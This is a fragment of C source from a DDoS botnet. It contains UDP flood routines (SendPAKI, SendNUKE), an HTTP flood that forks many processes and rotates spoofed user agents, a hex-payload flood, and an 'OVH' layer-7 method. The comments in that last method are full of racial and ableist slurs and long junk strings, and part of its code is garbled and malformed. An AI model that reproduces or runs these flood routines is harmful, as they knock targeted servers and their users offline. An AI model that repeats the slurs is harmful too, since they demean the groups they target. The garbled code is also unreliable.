        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}

void SendPAKI(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}

void SendNUKE(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}

const char * useragents[] = {
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
  "Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393",
  "Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
  "Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",
  "Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
  "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
  "Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
  "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
  "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
  "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
  "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
  "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
  "Mozilla/5.0 (PLAYSTATION 3; 3.55)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
};

void sendHTTP(unsigned char *ip, int port, int secs) {
	int i, sock;
	time_t start = time(NULL);
	
	char buffer[1];

    char request[512];
    const char *methods[] = {
        "GET",
        "HEAD",
        "POST"
    };
    const char *connections[] = {
        "close",
        "keep-alive",
        "accept"
    };
	
	int power = getdtablesize() / 2;
	for(i = 0; i < power; i++) {
		if(fork() == 0) {
			while(1) {
                sock = socket_connect(ip, port);
				if(sock != 0) {
                    strcpy(request, "");
                    strcpy(request + strlen(request), methods[rand() % (sizeof(methods) / sizeof(methods[0]))]);
                    strcpy(request + strlen(request), " / HTTP/1.1\r\nHost: ");
                    strcpy(request + strlen(request), ip);
                    strcpy(request + strlen(request), "\r\nUser-Agent: ");
                    strcpy(request + strlen(request), useragents[rand() % (sizeof(useragents) / sizeof(useragents[0]))]);
                    strcpy(request + strlen(request), "\r\nConnection: ");
                    strcpy(request + strlen(request), connections[rand() % (sizeof(connections) / sizeof(connections[0]))]);
                    strcpy(request + strlen(request), "\r\n\r\n");
                    write(sock, request, strlen(request));
                    read(sock, buffer, 1);
                    close(sock);
				}
				if(time(NULL) >= start + secs){
					_exit(0);
				}
			}
		}
	}
}

void sendHEX(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[512], buffer[1], hex_payload[2048];
	sprintf(hex_payload, "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA");
	for (i = 0; i < power; i++) {
		sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, hex_payload, host, useragents[(rand() % 36)]);
		if (fork()) {
			while (end > time(NULL)) {
				socket = socket_connect(host, port);
				if (socket != 0) {
					write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}

void ovhl7(char *host, in_port_t port, int timeEnd, int power) {//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    char request[512], buffer[1], pgetData[2048];//OVH METHOD BY BLAZING!//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    sprintf(pgetData, "\x00","\x01","\x02",//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x03","\x04","\x05","\x06","\x07","\x08","\x09",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x11","\x12","\x13","\x14","\x15","\x16","\x17",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x1f","\x20","\x21","\x22","\x23","\x24","\x25",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x34","\x35","\x36","\x37","\x38","\x39","\x3a",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFI